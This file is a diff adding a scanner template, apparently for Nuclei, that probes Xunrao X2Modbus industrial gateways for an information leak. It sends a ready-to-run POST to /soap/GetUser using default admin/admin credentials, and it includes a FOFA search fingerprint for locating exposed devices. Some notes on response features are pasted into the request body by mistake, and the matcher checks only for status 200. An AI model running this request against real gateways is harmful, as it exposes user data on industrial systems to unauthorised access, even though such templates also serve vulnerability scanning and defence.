@@ -1,0 +1,66 @@
+id: poc-gi3vux7hfu4m45i4
+info:
+  name: 迅饶科技 X2Modbus 网关 GetUser 敏感信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gi3vux7hfu4m45i4'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gi3vux7hfu4m45i4
+    fofa: server="SunFull-Webs"
+http:
+- raw:
+  - 'POST /soap/GetUser HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: language=zh-cn; username=admin1
+
+
+    If-Modified-Since: Sat Jun 29 10:02:08 2019
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    <GetUser><User Name="admin" Password="admin"/></GetUser>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    UserName
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
